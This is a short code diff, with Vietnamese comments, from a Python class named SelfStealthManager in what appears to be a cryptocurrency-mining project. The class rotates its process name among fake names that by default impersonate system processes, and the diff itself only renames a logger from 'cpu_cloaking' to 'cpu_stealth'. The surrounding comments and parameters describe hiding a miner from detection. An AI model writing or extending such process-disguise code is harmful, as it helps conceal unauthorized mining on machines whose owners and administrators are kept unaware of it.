@@ -52,7 +52,7 @@ class SelfStealthManager:
             target_names: Danh sách tên giả để rotation. Mặc định sử dụng system processes
             rotation_interval: Thời gian giữa các lần đổi tên (giây)
         """
-        self.logger = get_unified_logger('mining_environment.cpu_cloaking')
+        self.logger = get_unified_logger('mining_environment.cpu_stealth')
         self.logger.info("🔒 [SELF-STEALTH] Initializing Self-Stealth Manager")
         
         # **[Default Stealth Names]** (tên ẩn danh mặc định) - giả làm system processes
